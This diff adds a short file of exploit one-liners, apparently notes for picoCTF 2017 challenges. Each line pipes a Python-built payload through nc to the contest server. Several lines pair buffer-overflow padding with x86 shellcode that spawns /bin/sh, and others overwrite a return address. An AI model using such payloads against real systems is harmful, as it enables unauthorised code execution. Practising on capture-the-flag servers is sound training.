@@ -1,0 +1,19 @@
+(python -c "print 'A'*16 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'") | nc shell2017.picoctf.com 34621
+
+
+
+
+
+(python -c "print 'A'*(40-23) + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80' ") | nc shell2017.picoctf.com 34621
+
+(python -c "import sys; sys.stdout.write('A'*(40-23) + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80')") | nc shell2017.picoctf.com 34621
+
+
+
+python -c "import sys; sys.stdout.write('A'*(10-4) + '\x08\x04\x85\x46')" | nc shell2017.picoctf.com 18790
+
+python -c "import sys; sys.stdout.write('A'*(10-4) + '\x46\x85\x04\x08')" | nc shell2017.picoctf.com 18790
+
+
+python -c "print '\x46\x85\x04\x08'" | nc shell2017.picoctf.com 18790
+
